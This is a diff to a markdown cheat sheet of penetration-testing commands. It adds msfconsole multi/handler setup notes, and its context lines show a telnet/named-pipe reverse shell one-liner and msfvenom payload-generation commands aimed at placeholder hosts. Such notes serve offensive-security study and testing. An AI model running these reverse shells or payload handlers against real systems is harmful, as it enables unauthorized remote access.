@@ -19,6 +19,14 @@
 #### `mknod /tmp/backpipe p && telnet X.X.X.X YYY 0</tmp/backpipe | /bin/sh 1>/tmp/backpipe`
   * [archived](https://web.archive.org/web/20210310030514/https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
 
+# [msfconsole](https://www.offensive-security.com/metasploit-unleashed/msfconsole/):
+#### `msfconsole -q`
+#### `use multi/handler`
+  * Metasploit can do a million things, but a few that stand out as useful might be listed here
+  * -q runs it in quiet mode for less text
+  * Set up the multi handler to match payloads created with msfvenom to catch staged or unstaged payloads
+  
+
 # [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/):
 #### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows`
 #### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows -b "\x00\x0a\x0d"`
